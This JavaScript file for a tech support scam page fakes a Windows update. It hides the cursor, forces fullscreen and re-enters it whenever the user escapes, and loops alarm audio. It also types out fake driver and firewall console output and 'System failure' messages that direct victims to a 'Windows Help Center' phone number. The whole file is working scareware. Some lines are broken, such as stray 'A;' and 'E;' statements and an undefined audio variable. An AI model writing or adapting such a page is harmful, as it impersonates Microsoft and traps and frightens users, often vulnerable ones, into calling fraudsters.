const firstPage = document.querySelector("#first-page");
const firstTopBox = document.querySelector(".top-box");
const secondPage = document.querySelector("#second-page");
const thirdPage = document.querySelector("#third-page");
const fourthPage = document.querySelector("#fourth-page");
var aud = document.getElementById("pridez");

// --- MODIFICATION 1: Add this 'flag' variable ---
// This ensures the popup function can only run one time
let hasPopupClosed = false;

// This listener starts the whole process on the first mouse move
// document.addEventListener("mousemove", closeFirstPopup, { once: true });

// --- MODIFICATION 2: Add this click listener ---
// This makes ANY click on the page also start the process
document.addEventListener("click", closeFirstPopup, { once: true });

// This listener is for the cursor style (no change needed)
document.addEventListener("mousemove", (e) => {
  const popUp = document.querySelector(".popup-container");
  const cursorStyle = popUp.contains(e.target) ? "auto" : "none";
  document.body.style.cursor = cursorStyle;
});

function closeFirstPopup() {
  // --- MODIFICATION 3: Add these two lines ---
  // This checks the flag. If the function already ran, it stops.
  if (hasPopupClosed) return;
  hasPopupClosed = true; // Sets the flag so it can't run again

  // --- Original function continues below ---
  firstPage.style.display = "none";
  document.body.style.cursor = "none";
  secondPage.style.display = "flex";
  simulateF11Key();
  changeBackground();
  startDownload();
}

function changeBackground() {
  document.body.style.background = "rgba(30, 30, 30, 0.93)";
}

function showDisclaimerPopup() {
  const disclaimerPopup = document.querySelector("#disclaimerPopup");
  disclaimerPopup.style.display = "block";
}

// Second Page Effect Function
function startDownload() {
  let percent = document.getElementById("percent");
  let width = 0;
  let downloadInterval = setInterval(() => {
    if (width >= 100) {
      clearInterval(downloadInterval);
      percent.innerHTML = "Update Complete";
      secondPage.style.display = "none";
      changeBackground2();
      setTimeout(() => {
        changeBackground();
        thirdPage.style.display = "block";
      }, 5000);
      setTimeout(() => {
        thirdPage.style.display = "none";
        fourthPage.style.display = "block";
        setTimeout(() => {
          changeBackground();
          type();
        }, 1000);
        setTimeout(() => {
          downloadSimulation();
        }, 7000);
        setTimeout(() => {
          type2();
          _aud.play();
        }, 12000);
      }, 20000);
    } else {
      width++;
      percent.innerHTML = width + "%" + " Complete";
    }
  }, 150); // Adjust the speed of download here (smaller number for faster)
}

// fouth page effect fuction
const lines = [
  "Processing: brimi13i.inf",
  "Driver package added successfully.",
  "Published name : oem20.inf",
  "Please wait as this may take a while",
  "Number downloaded successfully: 1",
  "Do not turn off your system, otherwise your data may be lost or your system may be damaged.",
  "Please wait as this may take a while",
  "",
  "C:/Windows/system32>fireutil.exe",
  "Microsoft firewall Utility",
  "",
  "The operating system has been successfully scanned.",
  "Processing : oem12.inf",
  "Driver Pack Providers: Microsoft Technologies",
  "Class: System Devices",
  "Driver version: 6.9.9.4",
  "Do not turn off your system, your data may loss or your system get corrupted.",
  "For any querry contact to our help center at 1(833) 351-0619",
];

let lineIndex = 0;
let charIndex = 0;
const typingText = document.getElementById("typing-text");

function type() {
  if (lineIndex < lines.length) {
    if (charIndex < lines[lineIndex].length) {
      typingText.textContent += lines[lineIndex][charIndex];
      charIndex++;
      setTimeout(type, 0); // Adjust typing speed here (in milliseconds)
    } else {
      typingText.textContent += "\n"; // Move to next line
      lineIndex++;
      if (lineIndex === lines.length) {
        typingText.innerHTML +=
          "<p>Please contact to windows help center at 1(833) 351-0619.</p>"; // let p = document.querySelector('typingText p'); // p.style.color = 'red'
      }
      charIndex = 0;
      setTimeout(type, 0); // Delay before typing next line (in milliseconds)
    }
  }
}

const textElement = document.getElementById("text");
const progressBar = document.getElementById("progress-bar");

function downloadSimulation() {
  let progress = 0;
  const downloadInterval = setInterval(function () {
    progress += 10;
    let progressBarText = "[";
    let filledBars = Math.floor(progress / 4.3);
    for (let i = 0; i < 25; i++) {
      progressBarText += i < filledBars ? "▮" : "-"; // Filled with '▮' or unfilled with '-'
    }
    const percentage = "] " + filledBars * 4 + "%";
    textElement.textContent = "Update-processing: ";
    progressBar.textContent = progressBarText + percentage;
    if (progress >= 93) {
      clearInterval(downloadInterval); // Stop download when complete
      content = "Update failed!";
      textElement.style.color = "red";
      progressBar.style.display = "none";
      aud.currentTime = 0;
    } // else if (progress >= 0) { //   // aud.play(); // }
  }, Math.random(100) * 700); // Adjust the interval for updating progress (milliseconds)
}

let lines2 = [
  "System failure due to unusual activity.",
  "Do not turn off your computer as this may cause system damage or data loss.",
  "Contact the Windows Help Center at 1(833) 351-0619",
];

let lineInd = 0;
let charInd = 0;
const typingText2 = document.getElementById("typing-text2");

function type2() {
  if (lineInd < lines2.length) {
    if (charInd < lines2[lineInd].length) {
      typingText2.textContent += lines2[lineInd][charInd];
      charInd++;
      setTimeout(type2, 0); // Adjust typing speed here (in milliseconds)
    } else {
      typingText2.textContent += "\n"; // Move to next line
      lineInd++;
      charInd = 0;
      setTimeout(type2, 0); // Delay before typing next line (in milliseconds)
      setInterval(() => {
        aud.play();
        A;
      }, 12000);
    }
  }
}

// Third Page Scripting

function changeBackground2() {
  document.body.style.backgroundColor = "black";
}

// --- No changes needed to the fullscreen functions below ---
function enterFullScreen() {
  var el = document.documentElement,
    rfs =
      el.requestFullScreen ||
      el.webkitRequestFullScreen ||
      el.mozRequestFullScreen; // Check if fullscreen API is available before calling it
  if (rfs) {
    rfs.call(el);
  }
}

function handleFullScreenChange() {
  if (
    !document.fullscreenElement &&
    !document.webkitFullscreenElement &&
    !document.mozFullScreenElement
  ) {
    enterFullScreen(); // This will re-trigger fullscreen if the user tries to escape
    E;
  }
}

document.addEventListener("click", enterFullScreen);

function simulateF11Key() {
  enterFullScreen();

  document.addEventListener("fullscreenchange", handleFullScreenChange);
  document.addEventListener("webkitfullscreenchange", handleFullScreenChange);
  document.addEventListener("mozfullscreenchange", handleFullScreenChange);
}
